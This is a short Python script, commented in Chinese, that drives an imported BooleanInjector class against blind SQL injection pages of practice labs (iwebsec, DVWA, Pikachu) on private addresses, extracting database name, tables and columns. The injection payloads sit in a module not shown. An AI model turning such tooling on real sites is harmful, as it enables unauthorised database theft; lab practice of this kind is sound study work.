from bool_injector import *

# 带有正常回显的url
# iwebsec
url = "http://192.168.50.62/sqli/03.php?id=1"

# dvwa
# url = "http://192.168.50.145/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#"

# pikachu
# url = "http://192.168.50.145/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&submit=%E6%9F%A5%E8%AF%A2"

# for dvwa
# login_url = 'http://192.168.50.145/dvwa/login.php'
# username = 'admin'
# password = 'password'

cookie = {
    'PHPSESSID': 'kcogmnjqsqnobiqlb3vjdbtj08',
    'security': 'low'
}


def main():
    sqli = BooleanInjector(url=url,
                           cookie=cookie,
                           use_cookie=False,
                           show_payload=False)
    sqli.get_db_length()
    sqli.get_db_name()
    sqli.get_tables()
    sqli.get_columns()
    # print(sqli.ptable)


if __name__ == '__main__':
    main()
